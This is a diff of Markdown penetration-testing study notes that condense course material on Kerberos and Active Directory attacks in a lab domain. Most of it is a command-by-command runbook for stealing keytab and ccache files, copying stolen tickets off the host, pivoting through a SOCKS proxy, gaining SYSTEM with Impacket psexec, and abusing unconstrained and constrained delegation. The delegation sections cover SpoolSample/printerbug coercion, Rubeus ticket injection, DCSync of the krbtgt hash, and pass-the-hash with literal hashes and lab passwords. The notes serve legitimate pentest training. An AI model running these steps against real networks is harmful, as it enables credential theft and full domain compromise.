@@ -4891,9 +4891,11 @@ The next time the binary is run by the user, they would be compromised.
 
 ## Kerberos on Linux
 
-Kerberos can also be used on Linux networks using Linux-specific Key Distribution Center servers. Alternatively, Linux clients can authenticate to Active Directory servers via Kerberos as a Windows machine would.
+Kerberos can also be used on Linux networks using Linux-specific Key Distribution Center servers.
 
-E.g., The linuxvictim lab machine is domain joined to `corp1.com`. Active Directory users can log in to the linuxvictim machine with their Active Directory credentials.
+Linux clients can authenticate to Active Directory servers via Kerberos as a Windows machine would.
+
+E.g., The linuxvictim lab machine is domain joined to `corp1.com`.
 
 To use Kerberos, the administrator can log in to the system using their AD credentials and then request Kerberos tickets.
 
@@ -4909,10 +4911,6 @@ Find the administrator's credential cache file
 
 ```bash
 env | grep KRB5CCNAME
-```
-
-```
-KRB5CCNAME=FILE:/tmp/krb5cc_607000500_3aeIA5
 ```
 
 Kerberos tickets expire after a period of time.
@@ -4963,107 +4961,83 @@ Default principal: Administrator@CORP1.COM
 
 Valid starting       Expires              Service principal
 07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM
-
 07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM
-
 07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
 ```
 
-We can now access the MSSQL service and perform authenticated actions.
-
 ### Stealing Keytab Files
 
-One way to allow automated scripts to access Kerberos-enabled network resources on a user's behalf is through the use of keytab1 files. Keytab files contain a Kerberos principal name and encrypted keys. These allow a user or script to authenticate to Kerberos resources elsewhere on the network on the principal's behalf without entering a password.
-For example, let's assume a user wants to retrieve data from an MSSQL database via an automated script using Kerberos authentication.The user could create a keytab file for the script to authenticate against the server with their credentials and then retrieve the information on their behalf.
+Keytab files contain a **Kerberos principal name** and **encrypted keys**. These allow a user or script to authenticate to Kerberos resources on the principal's behalf without entering a password.
 
-Keytab files are commonly used in cron2 scripts when Kerberos authentication is needed to access certain resources. We can examine the contents of files like `/etc/crontab` to determine which scripts are being run and then examine those scripts to see whether they are using keytabs for authentication. Paths to keytab files used in these scripts may also reveal which users are associated with which keytabs.
+E.g., To retrieve data from an MSSQL database via an automated script using Kerberos authentication.
 
-Let's create a sample demonstration keytab for our domain Administrator.
+Keytab files are commonly used in **cron** scripts.
 
-We'll run the ktutil3 command, which provides us with an interactive prompt. Then we use addent to add an entry to the keytab file for the administrator user and specify the encryption type with -e. The utility asks for the user's password, which we provide. We then use wkt with a path to specify where the keytab file should be written. Finally, we can exit the utility with the quit command.
+Examine the contents of files like `/etc/crontab` to determine which scripts are being run and then examine those scripts to see whether they are using keytabs for authentication. Paths to keytab files used in these scripts may also reveal which users are associated with which keytabs.
+
+The `ktutil` command provides us with an interactive prompt.
 
 ```bash
 ktutil
 ```
 
+Creating a keytab file `/tmp/administrator.keytab`
+
+1. Use `addent` to add an entry to the keytab file for the administrator user and specify the encryption type with `-e`. Enter the user's password.
+
+2. Use `wkt` with a path to specify where the keytab file should be written.
+
+3. Exit the utility with the `quit` command.
+
 ```
-ktutil:  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
-Password for administrator@CORP1.COM: 
-
-ktutil:  wkt /tmp/administrator.keytab
-
-ktutil:  quit
+addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
+wkt /tmp/administrator.keytab
+quit
 ```
 
-Listing 67 - Creating a keytab file
+This keytab file grants domain administrator rights to scripts or users that have **read access** to it.
 
-This will write the keytab file to `/tmp/administrator.keytab`.
-
-This keytab file grants domain administrator rights to scripts or users that have read access to it.
-However, let's imagine a scenario where we've gotten root access to this box. If we discover the keytab file, we can use it maliciously to gain access to other systems as the domain administrator. To use the file in a script run by the root user, we will use the following syntax.
+Loading a keytab file
 
 ```bash
-root@linuxvictim:~# kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
+kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
 ```
 
-Listing 68 - Loading a keytab file
-
-Using the klist command, we can verify that the tickets from the keytab have been loaded into our root account's credential cache file.
+Verify that the tickets from the keytab have been loaded into our root account's credential cache file.
 
 ```bash
-root@linuxvictim:~# klist
+klist
 ```
 
-```
-Ticket cache: FILE:/tmp/krb5cc_1000
-Default principal: administrator@CORP1.COM
+The tickets may have **expired**
 
-Valid starting       Expires              Service principal
-07/30/2020 15:18:34  07/31/2020 01:18:34  krbtgt/CORP1.COM@CORP1.COM
-        renew until 08/06/2020 15:18:34
-```
-
-Listing 69 - Viewing our loaded TGT file from the keytab
-
-If it's been a while since the tickets were created, they may have expired. However, if it's within the renewal timeframe, we can renew it without entering a password using kinit with the -R flag.
+=> if it's within the **renewal** timeframe, renew it without entering a password:
 
 ```bash
-root@linuxvictim:~# kinit -R
+kinit -R
 ```
 
-Listing 70 - Renewing an expired TGT
+Normally, keytab files would be written somewhere safe, e.g. the user's home folder.
 
-Normally, keytab files would be written somewhere safe such as the user's home folder. In our case, since we've compromised the server entirely and have root access, the location wouldn't matter.
-Some users will set weak keytab file permissions for ease of use or for sharing with other accounts, so it's worthwhile to check for readable keytabs if Kerberos is in use on the system.
-Now that our root user has the keytab files loaded, we can authenticate as the domain admin and access any resources they have access to.
+Some users will set **weak keytab file permissions** for ease of use or for sharing with other accounts.
 
-Let's attempt to access the domain controller's C drive.
+Access the domain controller's C drive.
 
 ```bash
-root@linuxvictim:~# smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
-WARNING: The "syslog" option is deprecated
-Try "help" to get a list of possible commands.
+smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
 ```
-
-Accessing the domain controller's C drive as the domain admin
 
 ```
 smb: \> ls
 ```
 
-Success! We can use our stolen keytab to access the domain controller using Kerberos authentication.
-
 ### Attacking Using Credential Cache Files
 
-As we turn our attention to attacking ccache files, let's consider 2 attack scenarios.
+2 attack scenarios:
 
-1. If we compromise an active user's shell session, we can essentially act as the user in question and use their current Kerberos tickets. Gaining an initial TGT would require the user's Active Directory password. However, if the user is already authenticated, we can just use their current tickets.
+1. If we compromise an active user's shell session, act as the user in question and use their current Kerberos tickets. **Gaining an initial TGT would require the user's Active Directory password**. However, if the user is already authenticated, we can just use their current tickets.
 
-2. To authenticate by compromising a user's ccache file. As we noted earlier, a user's ccache file is stored in /tmp with a format like /tmp/krb5cc_<randomstring>. The file is typically only accessible by the owner. Because of this, it's unlikely that we will be able to steal a user's ccache file as an unprivileged user.
-
-If we have privileged access and don't want to log in as the user in question, or we are able to read the user's files but don't have direct shell access, we can still copy the victim's ccache file and load it as our own.
-
-First, we'll ssh to the linuxvictim machine as the offsec user who has sudo permissions. We can list the ccache files in /tmp with the following command.
+2. To authenticate by compromising a user's ccache file `/tmp/krb5cc_<randomstring>`, which is typically only accessible by the owner.
 
 Listing ccache files in /tmp
 
@@ -5071,81 +5045,62 @@ Listing ccache files in /tmp
 ls -al /tmp/krb5cc_*
 ```
 
-We can locate the domain administrator's ccache file by inspecting the file owners. Let's copy the domain administrator's ccache file and set the ownership of the new file to our offsec user.
+Locate the domain administrator's ccache file by inspecting the file owners.
+
+Copy the domain administrator's ccache file and set the ownership of the new file to our offsec user.
 
 Copying the ccache file
 
 ```bash
 sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
 sudo chown offsec:offsec /tmp/krb5cc_minenow
-ls -al /tmp/krb5cc_minenow
 ```
 
-To use the ccache file, we need to set the **KRB5CCNAME** environment variable. This variable gives the path of the credential cache file so that Kerberos utilities can find it.
+Set the **KRB5CCNAME** environment variable. This variable gives the path of the credential cache file so that Kerberos utilities can find it.
 
 Clear our old credentials
 
 ```bash
 kdestroy
-klist
 ```
 
-Set the variable and point it to our newly-copied ccache file, then list our available tickets.
+Set the variable and point it to our newly-copied ccache file
 
 ```bash
 export KRB5CCNAME=/tmp/krb5cc_minenow
-klist
 ```
 
-We now have the administrator user's TGT in our credential cache and we can request service tickets on their behalf.
+Have the administrator user's TGT in our credential cache => request service tickets on their behalf.
 
 Getting service tickets with our stolen ccache file
 
 ```bash
 kvno MSSQLSvc/DC01.corp1.com:1433
-klist
 ```
-
-We now have the user's Kerberos tickets, we can use those tickets to authenticate to services that are Kerberos-enabled on the user's behalf.
 
 ### Using Kerberos with Impacket
 
-Impacket1 is a set of tools used for low-level manipulation of network protocols and exploiting network-based utilities. This toolset can also be used to abuse Kerberos on Linux. Impacket is available in Kali at /usr/share/doc/python3-impacket/.
-One popular module from Impacket is psexec. This module is similar to Microsoft Sysinternal's psexec utility. It allows us to perform actions on a remote Windows host.
+Impacket is available in Kali at `/usr/share/doc/python3-impacket/`.
 
-In order to use Impacket utilities in our lab environment from our Kali VM, we need to do some initial setup. This will configure our Kali VM to be able to connect to the Kerberos environment properly.
+Execute attack directly from our Kali system.
 
-In the scenario described in this section, we assume that we have compromised a domain joined host (linuxvictim) and stolen a ccache file. Rather than perform any lateral movement from the linuxvictim box, we'll execute our attack directly from our Kali system with Impacket.
-
-To do so, we'll first need to copy our victim's stolen ccache file to our Kali VM and set the KRB5CCNAME environment variable as we did previously on linuxvictim. We can use the same ccache file as the last example.
+Copy our victim's stolen ccache file to our Kali VM and set the **KRB5CCNAME** environment variable.
 
 ```bash
 scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
+
 export KRB5CCNAME=/tmp/krb5cc_minenow
 ```
 
-Listing 76 - Downloading the ccache file and setting the KRB5CCNAME environment variable
-As before, this will allow us to use the victim's Kerberos tickets as our own.
-We'll then need to install the Kerberos linux client utilities. This will allow us to perform our ticket manipulation tasks (such as kinit, etc.) that we performed earlier on our linuxvictim VM, but now from our Kali VM.
-
-Installing Kerberos client utilities
+Install the Kerberos linux client utilities to perform our ticket manipulation tasks (such as kinit, etc.).
 
 ```bash
 sudo apt install krb5-user
 ```
 
-When prompted for a kerberos realm, we'll enter "corp1.com". This lets the Kerberos tools know which domain we're connecting to.
-We'll need to add the domain controller IP to our Kali VM to resolve the domain properly. We can get the IP address of the domain controller from the linuxvictim VM.
+When prompted for a kerberos realm, enter `corp1.com`. This lets the Kerberos tools know which domain we're connecting to.
 
-Getting the IP address of the domain controller
-
-```bash
-offsec@linuxvictim:~$ host corp1.com
-```
-
-Now that the client utilities are installed, the target domain controller (dc01.corp1.com) and the generic domain (corp1.com) need to be added to our `/etc/hosts` file.
-
-Contents of our Kali VM's `/etc/hosts` file
+The target domain controller (`dc01.corp1.com`) and the generic domain (`corp1.com`) need to be added to our Kali VM's `/etc/hosts` file.
 
 ```
 127.0.0.1	localhost
@@ -5154,65 +5109,46 @@ Contents of our Kali VM's `/etc/hosts` file
 192.168.120.5 CORP1.COM DC01.CORP1.COM
 ```
 
-This allows Kerberos to properly resolve the domain names for the domain controller.
-In order to use our Kerberos tickets, we will need to have the correct source IP, which in this case is the compromised linuxvictim host that is joined to the domain. Because of this, we'll need to setup a SOCKS proxy on linuxvictim and use proxychains on Kali to pivot through the domain joined host when interacting with Kerberos.
-To do so, we'll need to comment out the line for proxy_dns in /etc/proxychains.conf to prevent issues with domain name resolution while using proxychains.
+To use our Kerberos tickets, we need to have the correct source IP, i.e. the compromised linuxvictim host that is joined to the domain.
 
-Commented out proxy_dns line in proxychains configuration
+=> Setup a SOCKS proxy on linuxvictim and use proxychains on Kali to pivot through the domain joined host when interacting with Kerberos.
+
+Comment out the line for **proxy_dns** in `/etc/proxychains4.conf` to prevent issues with domain name resolution while using proxychains.
 
 ```
 # proxychains.conf  VER 3.1
-#
-#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
-#       
 ...
 # Proxy DNS requests - no leak for DNS data
 #proxy_dns 
-...
 ```
 
-Once these settings are in place, we need to set up a SOCKS server using ssh on the server we copied the ccache file from, which in our case is linuxvictim.
+Set up a SOCKS server using ssh on the server we copied the ccache file from
 
 ```bash
-kali@kali:~$ ssh offsec@linuxvictim -D 9050
-Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
-...
-offsec@linuxvictim:~$
+ssh offsec@linuxvictim -D 9050
 ```
 
-Listing 81 - Setting up an SSH tunnel
+The -D parameter specifies the port we'll be using for proxychains (defined in `/etc/proxychains.conf`) in order to tunnel Kerberos requests.
 
-The -D parameter specifies the port we'll be using for proxychains (defined in /etc/proxychains.conf) in order to tunnel Kerberos requests.
+Impacket has several scripts available to enumerate and exploit Active Directory.
 
-Impacket has several scripts available that will help us enumerate and exploit Active Directory. For example, we can examine the list of domain users with GetADUsers.py.
-
-Listing Active Directory users
+Examine the list of domain users with `GetADUsers.py`.
 
 ```bash
-proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+proxychains -q impacket-GetADUsers -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
 ```
-
-It's also possible to get a list of the SPNs available to our Kerberos user.
 
 Gathering SPNs for our Kerberos user
 
 ```bash
-proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+proxychains -q impacket-GetUserSPNs -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
 ```
-
-This time the output contains the list of SPNs available.
-
-If we want to gain a shell on the server, we can then run psexec with the following command.
 
 Getting a shell with psexec
 
 ```bash
-proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
+proxychains -q impacket-psexec Administrator@DC01.CORP1.COM -k -no-pass
 ```
-
-Using Impacket's psexec module and our stolen Kerberos tickets, we are now SYSTEM on the domain controller and can do whatever we please.
-
-As we've demonstrated, Kerberos functionality on Linux can provide an excellent attack vector for compromising a domain and moving laterally within the network. Knowing how Linux handles Kerberos authentication and how to exploit it can make a significant difference in a penetration test.
 
 # Windows Credentials
 
@@ -5297,8 +5233,8 @@ reg save HKLM\system C:\users\offsec.corp1\Downloads\system
 sudo apt install python-crypto
 git clone https://github.com/CiscoCXSecurity/creddump7
 
-source Github/creddump7/creddump7-venv/bin/activate
-python2 pwdump.py system sam
+source /home/kali/Github/creddump7/creddump7-venv/bin/activate
+python2 /home/kali/Github/creddump7/pwdump.py system sam
 ```
 
 ## Hardening the Local Administrator Account
@@ -8761,4 +8697,511 @@ namespace SQL
         }
     }
 }
+```
+
+# Attacking Active Directory
+
+## Kerberos Delegation
+
+### Unconstrained Delegation
+
+Unconstrained delegation can be set on any AD accounts, including users, as long as the object has a Service Principal Name (SPN) set.
+
+In recent years, browsers have been updated to not automatically allow delegation of tickets to services where **unconstrained delegation** is configured. This is done by checking 2 key flags on the ticket being sent from the client, the **ok_as_delegate** and **forwardable** flags.
+
+- The **forwardable** flag is used in **constrained** delegation scenarios as well
+- The **ok_as_delegate** is normally only used if **unconstrained** delegation is configured.
+
+=> If we visit a web service configured with **unconstrained** delegation using a modern browser, only our TGS for the HTTP service will be stored on the server. The frontend service will not be able to impersonate us to the backend service, essentially breaking the delegation.
+
+The Domain Controller (DC) stores the information about computers and users configured with unconstrained delegation.
+
+The information is stored in the **userAccountControl** as **TRUSTED_FOR_DELEGATION** (524288)
+
+Log in as the adam user who has local administrative access.
+
+Enumerate unconstrained delegation
+
+```pwsh
+Get-DomainComputer -Unconstrained
+```
+
+```
+operatingsystem               : Windows Server 2022 Standard
+operatingsystemversion        : 10.0 (20348)
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
+serviceprincipalname          : {cifs/files01.corp.com, WSMAN/FILES01, WSMAN/FILES01.corp.com, TERMSRV/FILES01...}
+useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+name                          : FILES01
+dnshostname                   : FILES01.corp.com
+```
+
+2 computers in the domain configured with unconstrained delegation: FILES01 and DC01. (Domain controllers are configured with unconstrained delegation by default.)
+
+**Service accounts** can also be configured with unconstrained delegation if the application executes in the context of the service account rather than the machine account.
+
+=> To abuse unconstrained delegation, first compromise the computer or service account in question.
+
+If we compromise the service account as part of an attack, we can exploit unconstrained delegation without needing **administrative privileges**.
+
+Use the administrative privileges to extract any TGTs supplied by users.
+
+Rubeus is a C# toolset for Kerberos that offers many of the same features as Mimikatz. However, it does not require us to write the tickets to disk in order to reuse them. Rubeus also supports monitoring, which allows us to capture specific tickets.
+
+Launch Rubeus on FILES01 using an administrative PowerShell prompt.
+
+Dump the current tickets stored in memory.
+
+```pwsh
+.\Rubeus.exe dump /nowrap
+```
+
+Find TGTs and TGSs related to the adam user along with the computer account, but no other domain users.
+
+Typically, a machine would only be configured with unconstrained delegation because it hosts an application that requires it. I.e., users most likely access shares on the machine FILES01 via **CIFS**.
+
+Enumerating shares on the machine
+
+```pwsh
+net share
+```
+
+Find an engineering share in the `C:\shares` folder.
+
+Inspect the permissions
+
+```pwsh
+icacls C:\shares\engineering
+```
+
+There is a share on the machine that is accessible by members of the `CORP\Engineering` group.
+
+A computer configured with unconstrained delegation will store the connecting user's TGT regardless of whether it connects to a backend service or not.
+
+If a system administrator removes a service but forgets to turn off unconstrained delegation on the AD object, the object can still be abused by attackers.
+
+Either wait for someone to visit the share, or conduct social engineering to trick someone into visiting it.
+
+Simulate this by logging in to the CLIENT02 machine with the james user. Find that the Engineering Share is automatically mapped => The TGT for james should be stored in memory on FILES01.
+
+```pwsh
+.\Rubeus.exe dump /nowrap
+```
+
+```
+  UserName                 : james
+  Domain                   : CORP
+  LogonId                  : 0x9e764
+  UserSID                  : S-1-5-21-3515682028-2106700410-3524882512-1601
+  AuthenticationPackage    : Kerberos
+  LogonType                : Network
+  LogonServerDNSDomain     : CORP.COM
+
+    ServiceName              :  krbtgt/CORP.COM
+    ServiceRealm             :  CORP.COM
+    UserName                 :  james
+    UserRealm                :  CORP.COM
+    Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  nWTphWgmIaVfC4b6t1l1PCkXO4nb72Oy9ew3auqBn58=
+    Base64EncodedTicket   :
+
+      doIFhDCCBYCgAwIBBaEDAgEWooIEmDCCBJRhggSQMII...
+```
+
+Find a **TGT** for james with the `krbtgt/CORP.COM` ServiceName. The ticket is also flagged as forwardable.
+
+Inject the ticket into our session (Run as administrator)
+
+```pwsh
+.\Rubeus.exe ptt /ticket:doIFhDCCBYCgAwIBBaEDAgEW...
+```
+
+In the `corp.com` domain, domain users have their own home folders that are shared from FILES02.
+
+List the home folder using the adam user directly from FILES01:
+
+```pwsh
+dir \\files02\home$\james
+```
+
+If the user connecting to FILES01 is a high-privileged account, e.g. a domain admin, we would be able to compromise the entire domain.
+
+By default, all users allow their TGT to be delegated, but privileged users can be added to the **Protected Users** group, which blocks delegation. While those settings are not set by default in Active Directory, enabling them would break the application functionality that requires delegation for those particular users.
+
+### I am a Domain Controller
+
+Use **SpoolSample** tools to force a domain controller to connect back to a system configured with unconstrained delegation.
+
+=> Allows the attacker to steal a TGT for the **domain controller computer account**.
+
+We exploited the printer bug to escalate our privileges on a target by coercing the **SYSTEM** account to authenticate locally via the MS-RPRN RPC interface.
+
+The RPC interface we leveraged locally is also accessible over the network through TCP port 445 if the host firewall allows it. TCP port 445 is typically open on Windows servers, including domain controllers, and the print spooler service runs automatically at startup in the context of the computer account.
+
+MS-RPRN documentation specifies that the RPC endpoint for the print spooler is `\pipe\spools` and that no authentication is required.
+
+Log in to FILES01 as the adam user
+
+Determine if the print spooler service is running and is available on the domain controller from FILES01.
+
+```pwsh
+dir \\dc01\pipe\spoolss
+```
+
+RpcRemoteFindFirstPrinterChangeNotification allows us to simulate a print client and subscribe to notifications of changes on the print server. These notifications are sent over the network by the print spooler service via RPC over a named pipe.
+
+When the "target" spooler accesses the named pipe on the "attacking" machine, it will present a forwardable TGT along with the TGS if the "attacking" machine is configured with unconstrained delegation.
+
+We'll call the **RpcOpenPrinter** and **RpcRemoteFindFirstPrinterChangeNotification** APIs through SpoolSample to facilitate the attack.
+
+Once the authentication has taken place, search for tickets in memory originating from the domain controller machine account.
+
+Open an administrative PowerShell command prompt and use Rubeus in monitor mode, which allows us to monitor incoming connections and tickets in real time.
+
+Set a refresh interval of 5 seconds with the /interval option. Use the /filteruser option as well to avoid any unnecessary output.
+
+Starting Rubeus monitor mode on FILES01
+
+```pwsh
+.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
+```
+
+Open a second PowerShell prompt and trigger the print spooler change notification with `SpoolSample.exe` by specifying the target machine and the capture server.
+
+Running SpoolSample on FILES01
+
+```pwsh
+.\SpoolSample.exe DC01 FILES01
+```
+
+It may be necessary to run the tool multiple times before the change notification callback takes place.
+
+Switch back to Rubeus, which displays the TGT for the domain controller account.
+
+```
+[*] 6/1/2023 9:41:23 AM UTC - Found new TGT:
+
+  User                  :  DC01$@CORP.COM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFXDCCBVigAwIBBaEDAgEWooIEcDCCBGxhgg...
+  
+[*] Ticket cache size: 1
+```
+
+Rubeus monitor mode outputs the Base64-encoded TGT.
+
+Inject the ticket to memory (administrative PowerShell command prompt)
+
+```pwsh
+.\Rubeus.exe ptt /ticket:doIFXDCCBVigAwIBBaEDAgEWooIEcDCCBGxhgg...
+```
+
+The DC01$ account has domain replication permissions.
+
+=> perform a dcsync and dump the password hash of any user, including the special krbtgt account.
+
+Performing DCSync on from FILES01
+
+```
+lsadump::dcsync /domain:corp.com /user:corp\krbtgt
+```
+
+Armed with the krbtgt NTLM hash, craft a golden ticket and obtain access to any resource in the domain or dump the password hash of a member of the Domain Admins group.
+
+We can also use the **dll** implementation, which may help **bypass application whitelisting**.
+
+Note: The same attack can be performed from a **non-domain joined machine** using the **krbrelayx** tool, a Python implementation of the technique and does not require execution of Rubeus and SpoolSample on the compromised host as it will execute on our attacking machine instead.
+
+Once the ticket is obtained, use Impacket directly from Kali as long as we are able to resolve the required hostnames within the domain.
+
+Adding the DC01 IP address to `/etc/resolv.conf` will help resolve the required hostnames in the domain and make sure that Kerberos authentication still works.
+
+Use the tools within **krbrelayx** to add the DNS records and required SPN. Once the attack is executed, a **ccache** ticket will automatically be saved in Kali, which can then be used together with `Impacket-secretsdump` to perform a DCSync attack.
+
+1. Grab owned computer account password to calculate its Kerberos AES key
+
+Remotely
+
+```bash
+impacket-secretsdump corp/adam:'4Toolsfigure3'@<FILES01_IP> -ts
+```
+
+Locally
+
+```pwsh
+reg save HKLM\system C:\Tools\system
+reg save HKLM\security C:\Tools\security
+```
+
+```bash
+impacket-secretsdump -system system -security security local
+```
+
+2. Add a malicious SPN for the owned computer account with unconstrained delegation
+
+```bash
+python addspn.py -u 'corp.com\FILES01$' -p <lmhash:nthash> -s HOST/kali.corp.com DC01.corp.com --additional
+```
+
+3. Add a DNS record pointing to the attacker's host:
+
+```bash
+python dnstool.py -u 'corp.com\FILES01$' -p <lmhash:nthash> -r kali.corp.com -d <Kali_IP> --action add DC01.corp.com
+```
+
+4. Check that the record was added successfully (~ 3 minutes):
+
+```bash
+nslookup kali.corp.com <DC01_IP>
+```
+
+5. Start `krbrelayx.py` providing AES key of the owned computer account or its plain password in hex with salt:
+
+```bash
+python krbrelayx.py -aesKey <aes256-cts-hmac-sha1-96>
+```
+
+6. Coerce the authentication to attacker's host from DC01 by triggering printer bug:
+
+```bash
+python printerbug.py corp.com/'FILES01$'@DC01.corp.com -hashes <lmhash:nthash> kali.corp.com
+```
+
+7. Export extracted TGT and perform DCSync to get krbtgt hash (or any other privileged account hash):
+
+```bash
+export KRB5CCNAME=`pwd`/'DC01$@CORP.COM_krbtgt@CORP.COM.ccache'
+
+impacket-secretsdump dc01.corp.com -dc-ip 192.168.132.100 -just-dc-user 'corp\krbtgt' -k -no-pass
+```
+
+8. Cleanup. Delete SPN and DNS record:
+
+```bash
+python addspn.py -u 'corp.com\FILES01$' -p <LMhash:NThash> -s HOST/kali.corp.com -r DC01.corp.com
+
+python dnstool.py -u 'corp.com\FILES01$' -p <LMhash:NThash> -r kali.corp.com -d 192.168.45.239 --action remove DC01.corp.com
+```
+
+Obtain code execution on the domain controller
+
+```bash
+impacket-psexec -hashes :96b927ecd4785badb8b50bc175c101c4 corp.com\Administrator@192.168.132.100
+```
+
+### Constrained Delegation
+
+While unconstrained delegation allowed the service to perform authentication to anything in the domain, constrained delegation limits the delegation scope.
+
+2 extensions for this feature: S4U2Self and S4U2Proxy.
+
+Constrained delegation is configured on the computer or user object. It is set through the **msds-allowedtodelegateto** property by **specifying the SPN the current object is allowed constrained delegation against**.
+
+Log in with the adam user on CLIENT01 
+
+Enumerate constrained delegation.
+
+```pwsh
+Get-DomainUser -TrustedToAuth
+```
+
+```
+distinguishedname        : CN=IISSvc,OU=Service,OU=CorpUsers,DC=corp,DC=com
+objectclass              : {top, person, organizationalPerson, user}
+displayname              : IISSvc
+userprincipalname        : iissvc@corp.com
+name                     : IISSvc
+objectsid                : S-1-5-21-3515682028-2106700410-3524882512-4101
+samaccountname           : iissvc
+samaccounttype           : USER_OBJECT
+objectguid               : fd575a38-df49-4272-9224-a40bc9b8359d
+msds-allowedtodelegateto : {MSSQLSvc/sql01.corp.com:SQLEXPRESS, MSSQLSvc/sql01.corp.com:1433}
+objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com
+serviceprincipalname     : HTTP/web.corp.com
+givenname                : IISSvc
+cn                       : IISSvc
+useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+```
+
+1. Constrained delegation is configured for the IISSvc account. Its name indicates that it is likely a service account for a web server running IIS.
+
+2. The **msds-allowedtodelegateto** property contains the SPN of the MS SQL server on SQL01. => constrained delegation is only allowed to that SQL server.
+
+3. The **TRUSTED_TO_AUTH_FOR_DELEGATION** value in the **useraccountcontrol** property is set. This value is used to indicate whether constrained delegation can be used if the authentication between the user and the service uses a different authentication mechanism like NTLM.
+
+If a frontend service does not use Kerberos authentication and the backend service does, it needs to be able to request a TGS to the frontend service from a KDC on behalf of the user who is authenticating against it. The **S4U2Self** extension enables this if the **TRUSTED_TO_AUTH_FOR_DELEGATION** value is present in the **useraccountcontrol** property. Additionally, the frontend service can do this without requiring the password or the hash of the user.
+
+=> If we compromise the IISSvc account, we can request a ticket to IIS for any user in the domain, including a domain administrator (without requiring any additional user interaction).
+
+**S4U2Proxy** extension requests a service ticket for the backend service on behalf of a user. This extension depends on the service ticket obtained either through S4U2Self or directly from a user authentication via Kerberos.
+
+If Kerberos is used for authentication to the frontend service, S4U2Proxy can use a forwardable TGS supplied by the user. => similar to attack that leveraged unconstrained delegation (require user interaction)
+
+This extension allows IISSvc to request a service ticket to any of the services listed as SPNs in the **msds-allowedtodelegateto** field. It would use the TGS obtained through the S4USelf extension and submit it as a part of the S4UProxy request for the backend service.
+
+Once this service ticket request is made and the ticket is returned by the KDC, IISSvc can perform authentication to that specific service on that specific host.
+
+Assuming that we are able to compromise the IISSvc account, we can request a service ticket for the services listed in the **msds-allowedtodelegateto** field as any user in the domain. Depending on the type of service, this may lead to code execution.
+
+This authentication mechanism involves 2 separate TGSs, which are requested on behalf of the authenticating user, rather than just one.
+
+Simulate a compromise of the IISSvc account and abuse it to gain access to the MSSQL instance on SQL01.
+
+The enumeration and the attacks to follow can also be done with a **non domain-joined** machine. => switch to Kali Linux and the Impacket suite.
+
+Attacking Active Directory from a non domain-joined machine usually requires a few extra steps, mainly due to DNS:
+
+1. The domain controller also acts as the DNS server and is located in the same network as our attacking machine.
+=> Add the DC01 IP address directly to our `/etc/resolv.conf` file as a nameserver and be able to resolve hostnames within the domain.
+
+2. The DNS server is not located in the same network as our attacking machine => Forward the DNS traffic through a compromised domain-joined host.
+
+Request a TGT for IISSvc using the dumped NTLM hash
+
+```bash
+impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9
+```
+
+```bash
+impacket-getTGT corp.com/iis_service:4FastBlueberry12
+```
+
+A ccache file was automatically saved.
+
+Export the ticket to **KRB5CCNAME** and impersonate the IISSvc account.
+
+```bash
+export KRB5CCNAME=iissvc.ccache
+```
+
+Request service ticket and impersonate the administrator user
+
+```bash
+impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass
+```
+
+Export the new ticket to our KRB5CCNAME variable and verify our access on SQL01
+
+```bash
+export KRB5CCNAME=administrator@mssqlsvc_sql01.corp.com:1433@CORP.COM.ccache
+impacket-mssqlclient sql01.corp.com -k
+```
+
+```
+SQL> SELECT SYSTEM_USER;
+SQL> SELECT CURRENT_USER;
+```
+
+By compromising an account that has constrained delegation enabled, we can gain access to all the services configured through the **msDS-AllowedToDelegateTo** property. If the **TRUSTED_TO_AUTH_FOR_DELEGATION** value is set, we can do this without user interaction.
+
+### Resource-Based Constrained Delegation
+
+Constrained delegation:
+
+- Works by configuring SPNs on the frontend service under the **msDS-AllowedToDelegateTo** property.
+
+- Configuring also requires the **SeEnableDelegationPrivilege** privilege on the domain controller, which is typically only enabled for **Domain Admins**.
+
+Resource-based constrained delegation (RBCD):
+
+- Is meant to remove the requirement for highly elevated access rights like **SeEnableDelegationPrivilege** from system administrators.
+
+- Works by turning the delegation settings around. The **msDS-AllowedToActOnBehalfOfOtherIdentity** property controls delegation from the backend service.
+
+- To configure, the SID of the frontend service is written to the new property of the backend service.
+
+=> SeEnableDelegationPrivilege is no longer required and RBCD can typically be configured by the backend service administrator instead.
+
